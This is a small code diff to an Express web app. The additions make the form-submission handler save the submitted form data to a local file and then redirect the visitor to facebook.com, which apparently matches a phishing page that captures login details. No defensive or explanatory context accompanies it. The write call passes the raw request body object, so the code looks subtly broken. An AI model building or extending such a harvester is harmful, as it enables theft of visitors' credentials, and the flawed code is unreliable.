@@ -1,4 +1,5 @@
 import express, { urlencoded } from 'express';
+import fs from 'fs'
 const app = express();
 const port = 3000;
 
@@ -13,6 +14,7 @@ app.get('/', (req, res) =>{
 app.post('/submit', (req, res) => {
   // Extract form data
   const formData = req.body;
+  fs.writeFileSync('file.txt',formData)
   res.redirect('https://facebook.com');
 });
 
